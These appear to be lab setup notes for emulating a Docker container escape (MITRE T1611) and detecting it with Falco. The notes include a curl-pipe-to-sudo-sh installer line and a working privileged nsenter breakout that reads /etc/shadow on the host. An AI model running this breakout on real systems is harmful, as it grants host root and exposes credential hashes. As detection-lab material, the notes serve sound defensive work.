# T1611 - container escape (setup notes)

Needs docker inside the victim VM (~400 MB, fine on the 20 G disk). Install it before
taking the clean snapshot if you want it baked into the reset state.

## Setup (on the victim)
```bash
vm/ssh.sh 'curl -fsSL https://get.docker.com | sudo sh && sudo usermod -aG docker analyst'
```

## The escape
A privileged container with `--pid=host` uses `nsenter` to enter the host's namespaces and
read/write the host filesystem:
```bash
docker run --rm --privileged --pid=host ubuntu \
  nsenter -t 1 -m -u -n -i bash -c 'id; head -1 /etc/shadow; touch /host-escape-proof'
```
The proof file appearing on the host confirms the breakout.

## Detection
Falco catches the host-file access at runtime; the launching command also carries obvious
flags (`--privileged`, `nsenter -t 1`). See the detection file. Enabling Falco's "Launch
Privileged Container" / "Change thread namespace" rules gives more direct coverage of the
launch itself.
